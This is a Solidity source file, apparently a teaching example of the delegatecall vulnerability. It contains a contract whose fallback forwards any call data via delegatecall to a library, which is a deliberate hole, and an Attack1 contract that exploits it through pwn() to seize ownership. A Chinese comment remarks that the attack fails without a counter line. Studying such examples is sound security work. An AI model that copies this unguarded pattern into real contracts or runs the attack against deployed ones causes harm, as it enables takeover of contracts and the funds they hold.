// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// Delegatecall - Vulnerability
// delegatecall is tricky to use and wrong usage or incorrect understanding can lead to devastating results.
// Your must keep 2 things in mind when using delegatecall.
// 1. delegatecall preserves context (storage, caller, etc...)
// 2. storage layout must be the same for the contract calling delegatecall and the contract getting called.
contract Lib1 {
    address public owner;
    function pwn() public {
        owner = msg.sender;
    }
    function getOwner() public view returns (address) {
        return owner;
    }
}

contract HackMe1 {
    address public owner;
    Lib1 public lib;

    constructor(Lib1 _lib) {
        owner = msg.sender;
        lib = Lib1(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack1 {
    address public hackMe;
    uint public count;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        (bool success, bytes memory data) = hackMe.call(abi.encodeWithSignature("pwn()"));
        //(bool success, bytes memory data) = hackMe.call(abi.encodeWithSelector(Lib1.pwn.selector));
        require(success, "Delegatecall failed!");
        count++; // 移除这一行会导致攻击失败???? 神奇.
    }
}